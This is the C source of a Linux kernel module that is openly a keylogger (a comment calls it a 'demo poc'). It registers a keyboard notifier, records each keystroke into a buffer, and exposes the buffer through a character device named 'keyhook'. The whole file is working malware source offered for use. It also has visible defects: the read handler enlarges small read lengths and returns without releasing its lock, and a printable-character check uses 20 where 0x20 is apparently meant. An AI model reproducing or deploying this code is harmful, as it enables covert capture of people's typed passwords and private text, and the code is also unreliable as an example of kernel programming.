// dumb keylog using notification chain api
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/mutex.h>
#include <linux/fs.h>

#define ISPRINT(c) (20 <= c && c <= 0x7e)
#define DEVICE_NAME "keyhook"
#define BUFFER_LIMIT 0x200

MODULE_LICENSE("GPL");
static int __init keyhook_init(void);
static void __exit keyhook_exit(void);
module_init(keyhook_init);
module_exit(keyhook_exit);

DEFINE_MUTEX(g_lock);
static unsigned char g_buffer[BUFFER_LIMIT+1];
static unsigned int  g_delta = 0;
// no need to sync, only ref in init/exit
static int g_devno = 0;

static ssize_t
keyhook_read(struct file* filp, char __user* buf, size_t len, loff_t* offset) {
  printk("[keyhook]: read initiated of %d bytes\n", g_delta);
  mutex_lock(&g_lock);
  if (len <= BUFFER_LIMIT)
    len = BUFFER_LIMIT;

  if (copy_to_user(buf, g_buffer, len))
    return -EFAULT;

g_delta = 0;
  memset(g_buffer, 0, BUFFER_LIMIT);
  mutex_unlock(&g_lock);
  return 0;
}

static int
keyhook_cb(struct notifier_block* nb, size_t action, void* _param) {
  // minimal, who gives a shit this is demo poc
  static char us_map[255] = {
    ' ', ' ', '1', '2', '3', '4', '5', '6', '7', '8', 
    '9', '0', '-', '=', '\b', '\t', 'q', 'w', 'e', 'r', 
    't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', ' ', 
    'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', 
    '\'', '`', 0, 0, 'z', 'x', 'c', 'v', 'b', 'n', 
    'm', ',', '.', '/', ' ', ' ', ' ', ' '
  };
  struct keyboard_notifier_param* kbp =
    (struct keyboard_notifier_param *)_param;
  if (kbp->down && action == KBD_KEYCODE) {
    mutex_lock(&g_lock);
    if (g_delta < BUFFER_LIMIT && ISPRINT(us_map[kbp->value]))
      g_buffer[g_delta++] = us_map[kbp->value];
    mutex_unlock(&g_lock);
  }
  return NOTIFY_OK;
}

static struct notifier_block keyhook_nb = {
  .priority = 0,
  .notifier_call=keyhook_cb
};
static int __init keyhook_init(void) {
  printk("[keyhook]: driver initialized!\n");
  static struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = keyhook_read
  };
  mutex_init(&g_lock);
  g_devno = register_chrdev(0, DEVICE_NAME, &fops);
  if (g_devno < 0) {
    printk(KERN_ALERT "Could not allocate character device region!\n");
    return g_devno;
  }
  printk("[keyhook]: device assiged major number: %d\n", g_devno);
  register_keyboard_notifier(&keyhook_nb);
  
  return 0;
}
static void __exit keyhook_exit(void) {
  unregister_keyboard_notifier(&keyhook_nb);
  unregister_chrdev(g_devno, DEVICE_NAME);
  printk("[keyhook]: driver exited!\n");
  return;
}
